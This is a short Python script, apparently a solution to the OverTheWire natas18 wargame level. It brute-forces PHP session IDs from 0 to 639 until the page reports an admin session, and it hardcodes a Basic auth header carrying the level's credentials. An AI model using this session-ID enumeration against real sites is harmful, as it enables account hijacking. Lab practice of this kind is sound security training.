import requests
import re
import os
import sys

AUTH = 'Basic bmF0YXMxODp4dktJcURqeTRPUHY3d0NSZ0RsbWowcEZzQ3NEamhkUA=='

def check(session_id):
    url = 'http://natas18.natas.labs.overthewire.org/index.php'
    cookies = dict(PHPSESSID=f'{session_id}')

    html_text = requests.get(url, headers={'Authorization': AUTH}, cookies=cookies).text
  
    result = bool(re.search('You are an admin', html_text))
    return [result, html_text]

for i in range(640):
    os.system('clear')
    print("%.2f" % (i * 100 / 640) + '%');

    result = check(i)
    if (result[0]):
        print(result[1])
        sys.exit()

